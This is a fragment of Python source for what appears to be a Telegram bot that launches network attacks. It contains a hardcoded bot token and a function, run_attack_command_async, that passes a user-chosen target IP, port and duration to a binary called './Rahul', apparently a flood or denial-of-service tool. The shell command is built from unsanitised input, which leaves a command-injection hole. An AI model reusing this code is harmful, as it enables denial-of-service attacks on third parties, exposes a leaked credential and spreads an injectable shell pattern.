...
# Configuration
TOKEN = '7456355387:AAEBNH7Bz5wZVG2_KYUOOugfapfZqAuFnhU'  # Replace with your Bot's token
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Rahul {target_ip} {target_port} {duration} 1000",
